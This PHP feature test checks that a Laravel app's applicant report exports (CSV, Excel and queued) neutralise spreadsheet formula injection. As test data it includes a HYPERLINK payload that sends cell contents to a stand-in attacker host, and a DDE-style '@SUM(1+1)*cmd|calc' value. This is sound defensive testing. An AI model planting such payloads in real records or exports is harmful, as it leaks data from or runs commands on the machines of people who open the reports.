<?php

namespace Tests\Feature;

use App\Exports\SpreadsheetSafety;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Storage;
use Laravel\Sanctum\Sanctum;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\Support\SeedsDomainData;
use Tests\TestCase;

/**
 * Audit R-09: exported text never runs as a spreadsheet formula.
 *
 * Applicants type their own names, addresses and contact numbers. A first name
 * of "=HYPERLINK(...)" used to be written raw to the CSV and as a live formula
 * to the Excel file, so it ran on the officer's computer when the report was
 * opened. Existing records may already hold such values, which is why the
 * defence sits at export time.
 */
class SpreadsheetExportSafetyTest extends TestCase
{
    use RefreshDatabase;
    use SeedsDomainData;

    private const PAYLOAD = '=HYPERLINK("http://evil.example/?d="&A1,"Click")';

    protected function setUp(): void
    {
        parent::setUp();
        $this->seedReferenceData();
    }

    private function seedApplicants(): void
    {
        $hr = $this->hrUser();
        $this->applicant($hr, ['first_name' => self::PAYLOAD, 'last_name' => 'Attacker', 'contact_number' => '@SUM(1+1)*cmd|calc']);
        $this->applicant($hr, ['first_name' => 'Juan', 'last_name' => 'Dela Cruz', 'contact_number' => '09171234567']);
        Sanctum::actingAs($hr);
    }

    public function test_the_rule_neutralises_formulas_but_leaves_ordinary_values_alone(): void
    {
        foreach (['=1+1', '+1+1', '-1+1', '@SUM(A1)', "\t=1", "\r=1", ' =1+1'] as $danger) {
            $this->assertSame("'".$danger, SpreadsheetSafety::cell($danger), json_encode($danger));
        }

        foreach (['Juan Dela Cruz', '-12.50', '+639171234567', '42', '', 'O\'Brien', 'Sta. Cruz, Laguna'] as $ordinary) {
            $this->assertSame($ordinary, SpreadsheetSafety::cell($ordinary), $ordinary);
        }

        $this->assertSame(5, SpreadsheetSafety::cell(5));
        $this->assertNull(SpreadsheetSafety::cell(null));
    }

    public function test_the_csv_download_neutralises_formula_text(): void
    {
        $this->seedApplicants();

        $response = $this->post('/api/v1/reports/export', ['report_type' => 'applicants', 'format' => 'csv'])->assertOk();
        $csv = $response->streamedContent();

        $rows = array_map('str_getcsv', array_filter(explode("\n", trim($csv))));
        $cells = array_merge(...$rows);

        $this->assertContains("'".self::PAYLOAD.' Attacker', $cells);
        $this->assertContains("'@SUM(1+1)*cmd|calc", $cells);
        $this->assertNotContains(self::PAYLOAD.' Attacker', $cells);

        // Legitimate values are untouched.
        $this->assertContains('Juan Dela Cruz', $cells);
        $this->assertContains('09171234567', $cells);
    }

    public function test_the_excel_download_writes_formula_text_as_plain_text(): void
    {
        $this->seedApplicants();

        $response = $this->post('/api/v1/reports/export', ['report_type' => 'applicants', 'format' => 'xlsx'])->assertOk();

        $sheet = IOFactory::load($response->getFile()->getPathname())->getActiveSheet();
        $found = false;

        foreach ($sheet->getRowIterator() as $row) {
            foreach ($row->getCellIterator() as $cell) {
                $this->assertNotSame(DataType::TYPE_FORMULA, $cell->getDataType(), 'Formula found at '.$cell->getCoordinate());

                if ($cell->getValue() === self::PAYLOAD.' Attacker') {
                    $found = true;
                    $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
                }
            }
        }

        $this->assertTrue($found, 'The applicant name should still appear, as text.');
    }

    public function test_the_queued_export_is_protected_the_same_way(): void
    {
        Storage::fake('local');
        config(['empower.reports.queue_threshold_rows' => 1]);
        $this->seedApplicants();

        $id = $this->post('/api/v1/reports/export', ['report_type' => 'applicants', 'format' => 'csv'])
            ->assertStatus(202)
            ->json('data.export_id');

        $path = \App\Models\ReportExport::findOrFail($id)->file_path;
        $csv = Storage::disk('local')->get($path);

        $this->assertStringContainsString("'".self::PAYLOAD, str_replace('""', '"', $csv));
        $this->assertStringNotContainsString(','.str_replace('"', '""', self::PAYLOAD), $csv);
    }
}
